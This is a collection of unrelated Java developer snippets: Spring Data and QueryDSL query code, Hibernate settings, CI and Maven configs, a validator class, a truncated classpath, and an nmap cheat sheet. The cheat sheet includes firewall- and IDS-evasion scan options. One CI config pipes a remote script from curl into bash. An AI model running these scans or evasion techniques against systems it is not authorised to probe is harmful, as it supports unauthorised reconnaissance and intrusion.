    @RequestMapping(method = RequestMethod.GET, value = "/api/myusers")
    @ResponseBody
    public Iterable<VersionEntity> findAllByWebQuerydsl(@QuerydslPredicate(root = VersionEntity.class) Predicate predicate) {
        return this.getVersionRepository().findAll(predicate);
    }
    @RequestMapping(method = RequestMethod.GET, value = "/myusers")
    @ResponseBody
    public Iterable<VersionEntity> findAllByQuerydsl(@RequestParam(value = "search") String search) {
        final SearchPredicatesBuilder builder = new SearchPredicatesBuilder();
        if (search != null) {
            final Pattern pattern = Pattern.compile("(\\w+?)(:|<|>)(\\w+?),");
            final Matcher matcher = pattern.matcher(search + ",");
            while (matcher.find()) {
                builder.with(matcher.group(1), SearchOperation.findByOperation(matcher.group(2)), matcher.group(3));
            }
        }
        final BooleanExpression exp = builder.build(VersionEntity.class);
        return this.getVersionRepository().findAll(exp);
    }
--------------------------------------------------------------------------------------------------------
    public Iterable<VersionEntity> searchVersions(final String searchText, int pageNo, int resultsPerPage) {
        final FullTextQuery jpaQuery = this.searchVersionsQuery(searchText);
        jpaQuery.setMaxResults(resultsPerPage);
        jpaQuery.setFirstResult((pageNo - 1) * resultsPerPage);
        return jpaQuery.getResultList();
    }

    public int searchVersionsTotalCount(final String searchText) {
        final FullTextQuery jpaQuery = this.searchVersionsQuery(searchText);
        return jpaQuery.getResultSize();
    }

    private FullTextQuery searchVersionsQuery(final String searchText) {
        final FullTextEntityManager fullTextEntityManager = Search.getFullTextEntityManager(this.getEntityManager());
        final QueryBuilder queryBuilder = fullTextEntityManager.getSearchFactory()
                .buildQueryBuilder()
                .forEntity(VersionEntity.class)
                .get();

        final org.apache.lucene.search.Query luceneQuery = queryBuilder
                .keyword()
                .wildcard()
                .onField("version")
                .boostedTo(5f)
                .matching(searchText + "*")
                .createQuery();
        return fullTextEntityManager.createFullTextQuery(luceneQuery, VersionEntity.class);
    }
--------------------------------------------------------------------------------------------------------
query.from(bonusPayout)
    .where(bonusPayout.id.eq(
        query.from(employeeBonuses)
            where(employeeBonuses.employee.id.eq('someid'))
            .uniqueResult(employeeBonuses.bonusPayout.id.max()))
    .uniqueResult(bonusPayout);
or, using .in()

query.from(bonusPayout)
    .where(bonusPayout.id.in(
        query.from(employeeBonuses)
            where(employeeBonuses.employee.id.eq('someid'))
            .list(employeeBonuses.bonusPayout.id.max()))
    .uniqueResult(bonusPayout);
Both of these statements fail when the subquery finds nothing. The only way I've been able to get this to work is by using coalesce() like this:

query.from(bonusPayout)
    .where(bonusPayout.id.in(
        query.from(employeeBonuses)
            where(employeeBonuses.employee.id.eq('someid'))
            .list(employeeBonuses.bonusPayout.id.max().coalesce(0L)))
    .uniqueResult(bonusPayout);
--------------------------------------------------------------------------------------------------------
hibernate.hbm2ddl.auto=update
#hibernate.hbm2ddl.auto=create
#hibernate.hbm2ddl.auto=create-drop
#hibernate.hbm2ddl.auto=validate
--------------------------------------------------------------------------------------------------------

import com.google.common.collect.Lists;
import entity.QUser;
import entity.User;
import entity.UserGroup;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import repository.UserRepository;

import java.util.List;

@Service
public class UserService {

    @Autowired
    UserRepository repository;

    //ищем по возрасту, исключая границы
    public List<User> getByAgeExcluding(Integer minAge, Integer maxAge) {
        return Lists.newArrayList(repository.findAll(QUser.user.age.between(minAge, maxAge)));
    }

    //ищем по возрасту, включая границы
    public List<User> getByAgeIncluding(Integer minAge, Integer maxAge) {
        return Lists.newArrayList(repository.findAll(QUser.user.age.goe(minAge).and(QUser.user.age.loe(maxAge))));
    }

    //ищем по ID
    public User getById(Long id) {
        return repository.findOne(QUser.user.id.eq(id)).orElse(new User());
    }

    public User get(Long id) {
        return repository.findById(id).orElse(new User());
    }

    //ищем по группам
    public List<User> getByGroups(List<UserGroup> groups) {
        return Lists.newArrayList(repository.findAll(QUser.user.group.in(groups)));
    }

    //ищем по имени
    public List<User> get(String name) {
        return Lists.newArrayList(repository.findAll(QUser.user.name.ne(name)));
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.jpa.repository.config.EnableJpaAuditing;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate;
import org.springframework.transaction.annotation.EnableTransactionManagement;
 
@Configuration
@EnableJpaAuditing(dateTimeProviderRef = "dateTimeProvider")
@EnableJpaRepositories(basePackages = {
        "net.petrikainulainen.springdata.jpa.todo"
})
@EnableTransactionManagement
class PersistenceContext {
 
    @Bean
    NamedParameterJdbcTemplate jdbcTemplate(DataSource dataSource) {
        return new NamedParameterJdbcTemplate(dataSource);
    }
     
    //Other beans are omitted for the sake of clarity
}
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.BeanPropertyRowMapper;
import org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate;
import org.springframework.stereotype.Repository;
import org.springframework.transaction.annotation.Transactional;
 
import java.util.HashMap;
import java.util.List;
import java.util.Map;
 
@Repository
final class TodoRepositoryImpl implements CustomTodoRepository {
 
    private static final String SEARCH_TODO_ENTRIES = "SELECT id, title FROM todos t WHERE " +
            "LOWER(t.title) LIKE LOWER(CONCAT('%',:searchTerm, '%')) OR " +
            "LOWER(t.description) LIKE LOWER(CONCAT('%',:searchTerm, '%')) " +
            "ORDER BY t.title ASC";
 
    private final NamedParameterJdbcTemplate jdbcTemplate;
 
    @Autowired
    TodoRepositoryImpl(NamedParameterJdbcTemplate jdbcTemplate) {
        this.jdbcTemplate = jdbcTemplate;
    }
 
    @Transactional(readOnly = true)
    @Override
    public List<TodoSearchResultDTO> findBySearchTerm(String searchTerm) {
        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("searchTerm", searchTerm);
 
        List<TodoSearchResultDTO> searchResults = jdbcTemplate.query(SEARCH_TODO_ENTRIES,
                queryParams,
                new BeanPropertyRowMapper<>(TodoSearchResultDTO.class)
        );
 
        return searchResults;
    }
}
--------------------------------------------------------------------------------------------------------

    @Value("#{T(java.lang.Boolean).parseBoolean('${hibernate.format_sql}')}")
    private Boolean dbFormatSql;
--------------------------------------------------------------------------------------------------------
    @SuppressWarnings({"rawtypes", "unchecked"})
    public static TypedQuery createCriteriaQueryForEntity(final Class entityClazz, final List criteriaFilters) {
        CriteriaBuilder cb = em.getCriteriaBuilder();
        CriteriaQuery createQuery = cb.createQuery(entityClazz);
        Root root = createQuery.from(entityClazz);
        CriteriaQuery select = createQuery.select(root);
        Predicate[] predicates = buildPredicates(criteriaFilters, root, cb);
        TypedQuery typedQuery = em.createQuery(select.where(cb.and(predicates)));
        return typedQuery;
    }
	
public class Specifications {

	public static Specification search(final List filters) {
		return new Specification() {
			@Override
			public Predicate toPredicate(Root root, 
						CriteriaQuery< ?> query, 
						CriteriaBuilder cb) {
				Predicate[] p = buildPredicates(filters, root, cb);
				return cb.and(p);
			}
           
			private Predicate[] buildPredicates(List filters, 
							Root root, 
							CriteriaBuilder cb) {
				//Build your predicates here.
			}
		};
	}
}

public static Predicate search(Entity agEntity) {
    QEntity qEntity = QEntity.entity;
    BooleanBuilder booleanBuilder = new BooleanBuilder();
    if (!StringUtils.isEmpty(agEntity.getAddress())){                                                                          

    booleanBuilder.and(qEntity.address.contains(agEntity.getAddress()));`
    /* Many other if conditions*/


    QEntity entitySubquery = QEntity.entity;      
    booleanBuilder=booleanBuilder.and(qEntity.version.eq(JPAExpressions
            .select(qEntity.version.max())
            .from(entitySubquery )
            .where(entitySubquery.id.eq(qagEntity.id))));
}
--------------------------------------------------------------------------------------------------------
Predicate titleAndDescriptionAre = QTodo.todo.title.eq("Foo")
                .and(QTodo.todo.description.eq("Bar"));
				
final class TodoPredicates {
 
    private TodoPredicates() {}
 
    static Predicate hasTitle(String title) {
        return QTodo.todo.title.eq(title);
    }
}
--------------------------------------------------------------------------------------------------------
language: java

script: ./gradlew build jacocoTestReport

jdk:
  - oraclejdk8

# Cache local Maven repository.
cache:
  directories:
    - $HOME/.m2
before_cache:
  - rm -Rf $HOME/.m2/repository/com/github/vineey/archelix-rsql

before_install:
 - chmod +x gradlew

after_success:
 - ./gradlew jacocoRootReport coveralls
--------------------------------------------------------------------------------------------------------
dist: trusty
language: java
install: mvn install -DskipTests=true -Dgpg.skip=true

jdk:
  - oraclejdk8
  - openjdk11

notifications:
  email: false

# whitelist
branches:
  only:
    - master

after_success:
  - bash <(curl -s https://codecov.io/bash)
--------------------------------------------------------------------------------------------------------
spring.devtools.restart.log-condition-evaluation-delta=false
spring.devtools.restart.exclude=static/**,public/**
spring.devtools.restart.additional-paths

public static void main(String[] args) {
	System.setProperty("spring.devtools.restart.enabled", "false");
	SpringApplication.run(MyApp.class, args);
}

https://docs.spring.io/spring-boot/docs/current/reference/htmlsingle/#boot-features-external-config-typesafe-configuration-properties
--------------------------------------------------------------------------------------------------------
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-enforcer-plugin</artifactId>
        <executions>
          <execution>
            <id>enforce-java</id>
            <phase>validate</phase>
            <goals>
              <goal>enforce</goal>
            </goals>
            <configuration>
              <rules>
                <requireJavaVersion>
                  <version>[1.8,)</version>
                  <message>[ERROR] The currently supported version of Java is 1.8 or higher</message>
                </requireJavaVersion>
                <requireMavenVersion>
                  <version>[3.0,)</version>
                  <message>[ERROR] The currently supported version of Maven is 3.0 or higher</message>
                </requireMavenVersion>
                <requirePluginVersions>
                  <banLatest>true</banLatest>
                  <banRelease>true</banRelease>
                  <banSnapshots>true</banSnapshots>
                  <phases>clean,deploy,site</phases>
                  <message>[ERROR] Best Practice is to always define plugin versions!</message>
                </requirePluginVersions>
              </rules>
            </configuration>
          </execution>
        </executions>
      </plugin>
      <plugin>
        <!-- Inherited from oss-base. Generate PackageVersion.java.-->
        <groupId>com.google.code.maven-replacer-plugin</groupId>
        <artifactId>replacer</artifactId>
        <executions>
          <execution>
            <id>process-packageVersion</id>
            <phase>generate-sources</phase>
          </execution>
        </executions>
      </plugin>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-compiler-plugin</artifactId>
        <version>3.0</version>
        <inherited>true</inherited>
        <configuration>
          <source>${javac.src.version}</source>
          <target>${javac.target.version}</target>
          <showDeprecation>true</showDeprecation>
          <showWarnings>true</showWarnings>
          <optimize>true</optimize>
          <compilerArguments>
            <Xmaxerrs>10000</Xmaxerrs>
            <Xmaxwarns>10000</Xmaxwarns>
            <Xlint />
            <Werror />
          </compilerArguments>
        </configuration>
      </plugin>
    </plugins>
--------------------------------------------------------------------------------------------------------
/*
		JavaUtils.INSTANCE
			.acceptIfNotNull(KafkaHeaders.GROUP_ID, MessageConverter.getGroupId(),
					(key, val) -> rawHeaders.put(key, val))
			.acceptIfNotNull(KafkaHeaders.ACKNOWLEDGMENT, acknowledgment, (key, val) -> rawHeaders.put(key, val))
			.acceptIfNotNull(KafkaHeaders.CONSUMER, consumer, (key, val) -> rawHeaders.put(key, val));
 */
--------------------------------------------------------------------------------------------------------
FloatStringConverter
--------------------------------------------------------------------------------------------------------
//    public static void main(String[] args) {
//        Holder<String> issue = new Holder<>("hello");
//        Holder<Integer> issue2 = issue.map(String::length);
//        System.out.println(issue2.element);
//    }
--------------------------------------------------------------------------------------------------------
public class CustomerValidator implements Validator {

    private final Validator addressValidator;

    public CustomerValidator(Validator addressValidator) {
        if (addressValidator == null) {
            throw new IllegalArgumentException("The supplied [Validator] is " +
                "required and must not be null.");
        }
        if (!addressValidator.supports(Address.class)) {
            throw new IllegalArgumentException("The supplied [Validator] must " +
                "support the validation of [Address] instances.");
        }
        this.addressValidator = addressValidator;
    }

    /**
     * This Validator validates Customer instances, and any subclasses of Customer too
     */
    public boolean supports(Class clazz) {
        return Customer.class.isAssignableFrom(clazz);
    }

    public void validate(Object target, Errors errors) {
        ValidationUtils.rejectIfEmptyOrWhitespace(errors, "firstName", "field.required");
        ValidationUtils.rejectIfEmptyOrWhitespace(errors, "surname", "field.required");
        Customer customer = (Customer) target;
        try {
            errors.pushNestedPath("address");
            ValidationUtils.invokeValidator(this.addressValidator, customer.getAddress(), errors);
        } finally {
            errors.popNestedPath();
        }
    }
}
--------------------------------------------------------------------------------------------------------
Scanning command syntax
Scanning Command Syntax

nmap [scan types] [options] {172.16.1.1 specification}

Port Specification options
Syntax 	Example 	Description
-P 	nmap –p 23 172.16.1.1 	Port scanning port specific port
-P 	nmap –p 23-100 172.16.1.1 	Port scanning port specific port range
-p 	nmap -pU:110,T:23-25,443 172.16.1.1 	U-UDP,T-TCP different port types scan
-p- 	nmap -p- 172.16.1.1 	Port scan for all ports
-p 	nmap -smtp,https 172.16.1.1 	Port scan from specified protocols
-F 	nmap –F 172.16.1.1 	Fast port scan for speed up
-P "*" 	namp -p "*" ftp 172.16.1.1 	Port scan using name
-r 	nmap -r 172.16.1.1 	Sequential port scan

 
Host /172.16.1.1 discovery
Switch/Syntax 	Example 	Description
-sL 	nmap 172.16.1.1-5 -sL 	List 172.16.1.1 without scanning
-sn 	nmap 172.16.1.1/8 -sn 	Disable port scanning
-Pn 	nmap 172.16.1.1-8 -Pn 	Port scans only and no host discovery
-PS 	nmap 172.16.1.185 -PS22-25,80 	TCP SYN discovery on specified port
-PA 	nmap 172.16.1.185 -PA22-25,80 	TCP ACK discovery on specified port
-PU 	nmap 172.16.1.1-8 -PU53 	UDP discovery on specified port
-PR 	nmap 172.16.1.1-1/8 -PR 	ARP discovery within local network
-n 	nmap 172.16.1.1 -n 	no DNS resolution

 
Nmap Port Scan types
Switch/Syntax 	Example 	Description
-sS 	nmap 172.16.1.1 -sS 	TCP SYN port scan
-sT 	nmap 172.16.1.1 -sT 	TCP connect port scan
-sA 	nmap 172.16.1.1 -sA 	TCP ACK port scan
-sU 	nmap 172.16.1.1 -sU 	UDP port scan
-Sf 	nmap -Sf 172.16.1.1 	TCP FIN scan
-sX 	nmap -SX 172.16.1.1 	XMAS scan
-Sp 	nmap -Sp 172.16.1.1 	Ping scan
-sU 	nmap -Su 172.16.1.1 	UDP scan
-sA 	nmap -Sa 172.16.1.1 	TCP ACK scan
-SL 	nmap -Sl 172.16.1.1 	list scan

 
Nmap Port Selection
nmap 172.16.1.1 	single IP scan
nmap 172.16.1.1 172.16.100.1 	scan specific IPs
nmap 172.16.1.1-254 	scan a range of IPs
nmap xyz.org 	scan a domain
nmap 10.1.1.0/8 	scan using CIDR notation
nmap -iL scan.txt 	scan 172.16.1.1s from a file
nmap --exclude 172.16.1.1 	specified IP s exclude from scan

 
Use of NMAP scripts NSE
nmap --script= test script 172.16.1.0/24 	execute thee listed script against target IP address
nmap --script-update-db 	adding new scripts
nmap -sV -sC 	use of safe default scripts for scan
nmap --script-help="Test Script" 	get help for script
Firewall proofing
nmap -f [172.16.1.1] 	scan fragment packets
nmap –mtu [MTU] [172.16.1.1] 	specify MTU
nmap -sI [zombie] [172.16.1.1] 	scan idle zoombie
nmap –source-port [port] [172.16.1.1] 	manual source port - specify
nmap –data-length [size] [172.16.1.1] 	randomly append data
nmap –randomize-hosts [172.16.1.1] 	172.16.1.1 scan order randomization
nmap –badsum [172.16.1.1] 	bad checksum

 
NMAP output formats
Default/normal output 	nmap -oN scan.txt 172.16.1.1
XML 	nmap -oX scanr.xml 172.16.1.1
Grepable format 	snmap -oG grep.txt 172.16.1.1
All formats 	nmap -oA 172.16.1.1
Scan options
Syntax 	Description
nmap -sP 172.16.1.1 	Ping scan only
nmap -PU 172.16.1.1 	UDP ping scan
nmap -PE 172.16.1.1 	ICMP echo ping
nmap -PO 172.16.1.1 	IP protocol ping
nmap -PR 172.16.1.1 	ARP ping
nmap -Pn 172.16.1.1 	Scan without pinging
nmap –traceroute 172.16.1.1 	Traceroute
NMAP Timing options
Syntax 	Description
nmap -T0 172.16.1.1 	Slowest scan
nmap -T1 172.16.1.1 	Tricky scan to avoid IDS
nmap -T2 172.16.1.1 	Timely scan
nmap -T3 172.16.1.1 	Default scan timer
nmap -T4 172.16.1.1 	Aggressive scan
nmap -T5 172.16.1.1 	Very aggressive scan
--------------------------------------------------------------------------------------------------------
"C:\Program Files\Java\jdk1.8.0_66\bin\java.exe" -ea -Didea.test.cyclic.buffer.size=1048576 "-javaagent:C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\lib\idea_rt.jar=39290:C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\bin" -Dfile.encoding=UTF-8 -classpath "C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\lib\idea_rt.jar;C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\junit\lib\junit-rt.jar;C:\Program Files\JetBrains\IntelliJ IDEA 2018.3.5\plugins\junit\lib\junit5-rt.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\charsets.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\deploy.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\ext\access-bridge-64.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\ext\cldrdata.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\ext\dnsns.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\ext\jaccess.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\ext\jfxrt.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\ext\localedata.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\ext\nashorn.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\ext\sunec.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\ext\sunjce_provider.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\ext\sunmscapi.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\ext\sunpkcs11.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\ext\zipfs.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\javaws.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\jce.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\jfr.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\jfxswt.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\jsse.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\management-agent.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\plugin.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\resources.jar;C:\Program Files\Java\jdk1.8.0_66\jre\lib\rt.jar;C:\Users\Alex\Documents\pem-message\common2\.build\bin\paragon.mailingcontour.commons.common\test-classes;C:\Users\Alex\Documents\pem-message\common2\.build\bin\paragon.mailingcontour.commons.common\classes;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-starter-aop\2.1.8.RELEASE\spring-boot-starter-aop-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-starter\2.1.8.RELEASE\spring-boot-starter-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot\2.1.8.RELEASE\spring-boot-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-autoconfigure\2.1.8.RELEASE\spring-boot-autoconfigure-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\javax\annotation\javax.annotation-api\1.3.2\javax.annotation-api-1.3.2.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-aop\5.1.9.RELEASE\spring-aop-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-beans\5.1.9.RELEASE\spring-beans-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\aspectj\aspectjweaver\1.9.4\aspectjweaver-1.9.4.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-starter-security\2.1.8.RELEASE\spring-boot-starter-security-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\security\spring-security-config\5.1.6.RELEASE\spring-security-config-5.1.6.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\security\spring-security-web\5.1.6.RELEASE\spring-security-web-5.1.6.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-expression\5.1.9.RELEASE\spring-expression-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-starter-actuator\2.1.8.RELEASE\spring-boot-starter-actuator-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-actuator-autoconfigure\2.1.8.RELEASE\spring-boot-actuator-autoconfigure-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-actuator\2.1.8.RELEASE\spring-boot-actuator-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\com\fasterxml\jackson\datatype\jackson-datatype-jsr310\2.9.9\jackson-datatype-jsr310-2.9.9.jar;C:\Users\Alex\.m2\repository\io\micrometer\micrometer-core\1.1.6\micrometer-core-1.1.6.jar;C:\Users\Alex\.m2\repository\org\hdrhistogram\HdrHistogram\2.1.9\HdrHistogram-2.1.9.jar;C:\Users\Alex\.m2\repository\org\latencyutils\LatencyUtils\2.0.3\LatencyUtils-2.0.3.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-starter-logging\2.1.8.RELEASE\spring-boot-starter-logging-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\ch\qos\logback\logback-classic\1.2.3\logback-classic-1.2.3.jar;C:\Users\Alex\.m2\repository\ch\qos\logback\logback-core\1.2.3\logback-core-1.2.3.jar;C:\Users\Alex\.m2\repository\org\apache\logging\log4j\log4j-to-slf4j\2.11.2\log4j-to-slf4j-2.11.2.jar;C:\Users\Alex\.m2\repository\org\apache\logging\log4j\log4j-api\2.11.2\log4j-api-2.11.2.jar;C:\Users\Alex\.m2\repository\org\slf4j\jul-to-slf4j\1.7.28\jul-to-slf4j-1.7.28.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-starter-web\2.1.8.RELEASE\spring-boot-starter-web-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-starter-json\2.1.8.RELEASE\spring-boot-starter-json-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\com\fasterxml\jackson\datatype\jackson-datatype-jdk8\2.9.9\jackson-datatype-jdk8-2.9.9.jar;C:\Users\Alex\.m2\repository\com\fasterxml\jackson\module\jackson-module-parameter-names\2.9.9\jackson-module-parameter-names-2.9.9.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-starter-tomcat\2.1.8.RELEASE\spring-boot-starter-tomcat-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\apache\tomcat\embed\tomcat-embed-core\9.0.24\tomcat-embed-core-9.0.24.jar;C:\Users\Alex\.m2\repository\org\apache\tomcat\embed\tomcat-embed-el\9.0.24\tomcat-embed-el-9.0.24.jar;C:\Users\Alex\.m2\repository\org\apache\tomcat\embed\tomcat-embed-websocket\9.0.24\tomcat-embed-websocket-9.0.24.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-web\5.1.9.RELEASE\spring-web-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-webmvc\5.1.9.RELEASE\spring-webmvc-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-starter-data-redis\2.1.8.RELEASE\spring-boot-starter-data-redis-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\io\lettuce\lettuce-core\5.1.8.RELEASE\lettuce-core-5.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\io\netty\netty-common\4.1.39.Final\netty-common-4.1.39.Final.jar;C:\Users\Alex\.m2\repository\io\netty\netty-handler\4.1.39.Final\netty-handler-4.1.39.Final.jar;C:\Users\Alex\.m2\repository\io\netty\netty-buffer\4.1.39.Final\netty-buffer-4.1.39.Final.jar;C:\Users\Alex\.m2\repository\io\netty\netty-codec\4.1.39.Final\netty-codec-4.1.39.Final.jar;C:\Users\Alex\.m2\repository\io\netty\netty-transport\4.1.39.Final\netty-transport-4.1.39.Final.jar;C:\Users\Alex\.m2\repository\io\netty\netty-resolver\4.1.39.Final\netty-resolver-4.1.39.Final.jar;C:\Users\Alex\.m2\repository\io\projectreactor\reactor-core\3.2.12.RELEASE\reactor-core-3.2.12.RELEASE.jar;C:\Users\Alex\.m2\repository\org\reactivestreams\reactive-streams\1.0.3\reactive-streams-1.0.3.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-starter-data-jpa\2.1.8.RELEASE\spring-boot-starter-data-jpa-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-starter-jdbc\2.1.8.RELEASE\spring-boot-starter-jdbc-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\com\zaxxer\HikariCP\3.2.0\HikariCP-3.2.0.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-jdbc\5.1.9.RELEASE\spring-jdbc-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\javax\transaction\javax.transaction-api\1.3\javax.transaction-api-1.3.jar;C:\Users\Alex\.m2\repository\javax\xml\bind\jaxb-api\2.3.1\jaxb-api-2.3.1.jar;C:\Users\Alex\.m2\repository\javax\activation\javax.activation-api\1.2.0\javax.activation-api-1.2.0.jar;C:\Users\Alex\.m2\repository\org\hibernate\hibernate-core\5.3.11.Final\hibernate-core-5.3.11.Final.jar;C:\Users\Alex\.m2\repository\javax\persistence\javax.persistence-api\2.2\javax.persistence-api-2.2.jar;C:\Users\Alex\.m2\repository\antlr\antlr\2.7.7\antlr-2.7.7.jar;C:\Users\Alex\.m2\repository\org\jboss\jandex\2.0.5.Final\jandex-2.0.5.Final.jar;C:\Users\Alex\.m2\repository\org\dom4j\dom4j\2.1.1\dom4j-2.1.1.jar;C:\Users\Alex\.m2\repository\org\hibernate\common\hibernate-commons-annotations\5.0.4.Final\hibernate-commons-annotations-5.0.4.Final.jar;C:\Users\Alex\.m2\repository\org\springframework\data\spring-data-jpa\2.1.10.RELEASE\spring-data-jpa-2.1.10.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\data\spring-data-commons\2.1.10.RELEASE\spring-data-commons-2.1.10.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-orm\5.1.9.RELEASE\spring-orm-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-aspects\5.1.9.RELEASE\spring-aspects-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-starter-cache\2.1.8.RELEASE\spring-boot-starter-cache-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-context-support\5.1.9.RELEASE\spring-context-support-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\boot\spring-boot-configuration-processor\2.1.8.RELEASE\spring-boot-configuration-processor-2.1.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\security\spring-security-jwt\1.0.10.RELEASE\spring-security-jwt-1.0.10.RELEASE.jar;C:\Users\Alex\.m2\repository\org\bouncycastle\bcpkix-jdk15on\1.60\bcpkix-jdk15on-1.60.jar;C:\Users\Alex\.m2\repository\org\bouncycastle\bcprov-jdk15on\1.60\bcprov-jdk15on-1.60.jar;C:\Users\Alex\.m2\repository\org\springframework\retry\spring-retry\1.2.4.RELEASE\spring-retry-1.2.4.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-core\5.1.9.RELEASE\spring-core-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-jcl\5.1.9.RELEASE\spring-jcl-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\data\spring-data-redis\2.1.10.RELEASE\spring-data-redis-2.1.10.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\data\spring-data-keyvalue\2.1.10.RELEASE\spring-data-keyvalue-2.1.10.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-tx\5.1.9.RELEASE\spring-tx-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-oxm\5.1.9.RELEASE\spring-oxm-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\slf4j\slf4j-api\1.7.28\slf4j-api-1.7.28.jar;C:\Users\Alex\.m2\repository\org\springframework\kafka\spring-kafka\2.2.8.RELEASE\spring-kafka-2.2.8.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-context\5.1.9.RELEASE\spring-context-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\springframework\spring-messaging\5.1.9.RELEASE\spring-messaging-5.1.9.RELEASE.jar;C:\Users\Alex\.m2\repository\org\apache\kafka\kafka-clients\2.0.1\kafka-clients-2.0.1.jar;C:\Users\Alex\.m2\repository\org\lz4\lz4-java\1.4.1\lz4-java-1.4.1.jar;C:\Users\Alex\.m2\repository\org\xerial\snappy\snappy-java\1.1.7.1\snappy-java-1.1.7.1.jar;C:\Users\Alex\.m2\repository\com\github\ben-manes\caffeine\caffeine\2.7.0\caffeine-2.7.0.jar;C:\Users\Alex\.m2\repository\org\checkerframework\checker-qual\2.6.0\checker-qual-2.6.0.jar;C:\Users\Alex\.m2\repository\com\google\errorprone\error_prone_annotations\2.3.3\error_prone_annotations-2.3.3.jar;C:\Users\Alex\.m2\repository\org\apache\commons\commons-lang3\3.9\commons-lang3-3.9.jar;C:\Users\Alex\.m2\repository\org\apache\commons\commons-text\1.7\commons-text-1.7.jar;C:\Users\Alex\.m2\repository\commons-collections\commons-collections\3.2.2\commons-collections-3.2.2.jar;C:\User